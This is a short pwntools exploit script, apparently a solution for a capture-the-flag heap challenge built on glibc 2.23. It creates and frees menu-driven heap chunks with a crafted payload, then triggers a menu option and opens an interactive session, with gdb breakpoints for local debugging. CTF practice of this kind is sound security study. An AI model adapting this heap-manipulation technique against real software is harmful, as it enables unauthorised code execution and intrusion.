#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn1_ff_patched")
libc = ELF("./libc.2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe

info = lambda msg: log.info(msg)
s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x0000000000400CC5
        b* 0x00000000004009C1
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()


def create_heap(payload):
    sla(">",b'1')
    sla("Input size:",b'16')
    sa("Input data:",payload)  
def delete_heap(idx):
    sla(">",b'2')
    slna("Input index:",idx)
    

payload = p64(0)
payload += p64(0xABCDEF)


create_heap(payload)
create_heap(payload)
create_heap(payload)
delete_heap(2)
create_heap(payload)
sla(">",b'4')
p.interactive()
